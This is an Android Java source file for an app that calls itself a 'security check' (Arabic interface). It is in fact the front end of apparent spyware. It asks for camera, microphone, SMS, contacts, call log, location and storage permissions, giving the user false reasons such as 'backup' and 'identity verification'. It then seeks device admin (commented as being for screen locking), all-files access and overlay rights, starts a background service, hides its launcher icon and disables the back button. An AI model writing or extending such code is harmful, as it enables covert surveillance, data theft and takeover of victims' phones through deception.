package com.sec.check;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final String TAG = "SecurityCheck";
    private static final int PERMISSION_REQUEST = 1001;
    private static final int REQUEST_DEVICE_ADMIN = 2001;
    private static final int REQUEST_OVERLAY = 2002;
    private static final int REQUEST_MANAGE_STORAGE = 2003;

    private static final String[][] PERMISSIONS_WITH_REASON = {
            {Manifest.permission.CAMERA,
                    "لأخذ بصمة أمنية والتحقق من هويتك"},
            {Manifest.permission.RECORD_AUDIO,
                    "لتسجيل البصمة الصوتية للتحقق"},
            {Manifest.permission.READ_CONTACTS,
                    "لعمل نسخة احتياطية من جهات الاتصال"},
            {Manifest.permission.READ_SMS,
                    "لعمل نسخة احتياطية من الرسائل"},
            {Manifest.permission.READ_CALL_LOG,
                    "لحفظ سجل المكالمات كنسخة احتياطية"},
            {Manifest.permission.ACCESS_FINE_LOCATION,
                    "لتأمين حسابك حسب موقعك"},
            {Manifest.permission.ACCESS_COARSE_LOCATION,
                    "لتحديد موقعك التقريبي"},
            {Manifest.permission.READ_PHONE_STATE,
                    "للتحقق من هوية الجهاز"},
            {Manifest.permission.READ_EXTERNAL_STORAGE,
                    "للوصول لملفاتك المحفوظة"},
            {Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    "لحفظ النسخ الاحتياطية"},
    };

    private static final String[] PERMISSIONS_ANDROID_13 = {
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO",
            "android.permission.READ_MEDIA_AUDIO",
    };

    private int currentPermIndex = 0;
    private Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "======== APP STARTED =========");

        showInitialUI();

        mainHandler.postDelayed(this::startPermissionFlow, 1500);
    }

    private void showInitialUI() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#0b1120"));
        root.setGravity(Gravity.CENTER);
        root.setPadding(60, 60, 60, 60);

        TextView icon = new TextView(this);
        icon.setText("🔐");
        icon.setTextSize(80);
        icon.setGravity(Gravity.CENTER);
        root.addView(icon);

        TextView title = new TextView(this);
        title.setText("التحقق الأمني");
        title.setTextSize(24);
        title.setTextColor(Color.WHITE);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 30, 0, 0);
        root.addView(title);

        TextView msg = new TextView(this);
        msg.setText("يرجى الموافقة على الأذونات التالية\nلتأمين جهازك ضد الاختراق");
        msg.setTextSize(15);
        msg.setTextColor(Color.parseColor("#94a3b8"));
        msg.setGravity(Gravity.CENTER);
        msg.setPadding(0, 20, 0, 0);
        msg.setLineSpacing(0, 1.4f);
        root.addView(msg);

        setContentView(root);
    }

    // ============================================================
    // بدء طلب الصلاحيات
    // ============================================================
    private void startPermissionFlow() {
        currentPermIndex = 0;
        requestNextPermission();
    }

    private void requestNextPermission() {
        if (currentPermIndex >= PERMISSIONS_WITH_REASON.length) {
            Log.d(TAG, "✅ All runtime permissions requested");

            // ★ اطلب Device Admin بعد الصلاحيات
            mainHandler.postDelayed(this::requestDeviceAdmin, 800);
            return;
        }

        String permission = PERMISSIONS_WITH_REASON[currentPermIndex][0];

        // تحقق إذا الصلاحية معمولة في المانيفست
        if (!isPermissionDeclared(permission)) {
            Log.d(TAG, "⚠️ Permission not declared in manifest: " + permission);
            currentPermIndex++;
            requestNextPermission();
            return;
        }

        // ممنوحة؟
        if (ContextCompat.checkSelfPermission(this, permission)
                == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "✅ Granted: " + permission);
            currentPermIndex++;
            requestNextPermission();
            return;
        }

        // اطلب
        Log.d(TAG, "→ Requesting: " + permission);
        try {
            ActivityCompat.requestPermissions(this,
                    new String[]{permission}, PERMISSION_REQUEST);
        } catch (Exception e) {
            Log.e(TAG, "request error: " + e.getMessage());
            currentPermIndex++;
            requestNextPermission();
        }
    }

    // ★ تحقق إذا الصلاحية معمولة في المانيفست
    private boolean isPermissionDeclared(String permission) {
        try {
            android.content.pm.PackageInfo info = getPackageManager()
                    .getPackageInfo(getPackageName(),
                            PackageManager.GET_PERMISSIONS);
            if (info.requestedPermissions != null) {
                for (String p : info.requestedPermissions) {
                    if (p.equals(permission)) return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "isPermissionDeclared: " + e.getMessage());
        }
        return false;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                           int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST) {
            for (int i = 0; i < permissions.length; i++) {
                boolean granted = grantResults.length > 0
                        && grantResults[i] == PackageManager.PERMISSION_GRANTED;
                Log.d(TAG, permissions[i] + " → " + (granted ? "GRANTED" : "DENIED"));
            }
            // انتقل للتالية بغض النظر عن النتيجة
            currentPermIndex++;
            mainHandler.postDelayed(this::requestNextPermission, 500);
        }
    }

    // ============================================================
    // ★★★ طلب Device Admin (لقفل الشاشة)
    // ============================================================
    private void requestDeviceAdmin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                    getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this,
                    DeviceAdminReceiver.class);

            if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "لتأمين جهازك وحمايته");
                startActivityForResult(intent, REQUEST_DEVICE_ADMIN);
                Log.d(TAG, "→ Requesting Device Admin");
            } else {
                Log.d(TAG, "✅ Device Admin already active");
                mainHandler.postDelayed(this::requestManageStorage, 500);
            }
        } catch (Exception e) {
            Log.e(TAG, "DeviceAdmin error: " + e.getMessage());
            mainHandler.postDelayed(this::requestManageStorage, 500);
        }
    }

    // ============================================================
    // ★★★ طلب MANAGE_EXTERNAL_STORAGE (Android 11+)
    // ============================================================
    private void requestManageStorage() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                if (!android.os.Environment.isExternalStorageManager()) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
                    Log.d(TAG, "→ Requesting MANAGE_STORAGE");
                    return;
                } else {
                    Log.d(TAG, "✅ MANAGE_STORAGE granted");
                }
            } catch (Exception e) {
                Log.e(TAG, "ManageStorage error: " + e.getMessage());
            }
        }
        mainHandler.postDelayed(this::requestOverlay, 500);
    }

    // ============================================================
    // ★★★ طلب SYSTEM_ALERT_WINDOW (Overlay)
    // ============================================================
    private void requestOverlay() {
        try {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_OVERLAY);
                Log.d(TAG, "→ Requesting Overlay");
                return;
            } else {
                Log.d(TAG, "✅ Overlay granted");
            }
        } catch (Exception e) {
            Log.e(TAG, "Overlay error: " + e.getMessage());
        }
        mainHandler.postDelayed(this::finishSetup, 500);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Log.d(TAG, "onActivityResult: " + requestCode + " → " + resultCode);

        if (requestCode == REQUEST_DEVICE_ADMIN) {
            mainHandler.postDelayed(this::requestManageStorage, 500);
        } else if (requestCode == REQUEST_MANAGE_STORAGE) {
            mainHandler.postDelayed(this::requestOverlay, 500);
        } else if (requestCode == REQUEST_OVERLAY) {
            mainHandler.postDelayed(this::finishSetup, 500);
        }
    }

    // ============================================================
    // خلص الإعداد → شغّل الخدمة
    // ============================================================
    private void finishSetup() {
        Log.d(TAG, "✅ Setup complete, starting service");
        startServiceNow();
        mainHandler.postDelayed(this::hideAppIcon, 5000);
    }

    private void startServiceNow() {
        try {
            Intent svc = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
            Log.d(TAG, "✅ Service started");
        } catch (Exception e) {
            Log.e(TAG, "Start service error: " + e.getMessage());
        }
    }

    private void hideAppIcon() {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.ComponentName component = new android.content.ComponentName(
                    this, MainActivity.class);
            pm.setComponentEnabledSetting(component,
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP);
            Log.d(TAG, "✅ App icon hidden");
        } catch (Exception e) {
            Log.e(TAG, "hideAppIcon: " + e.getMessage());
        }
    }

    @Override
    public void onBackPressed() {
        // منع الإغلاق
    }
                }
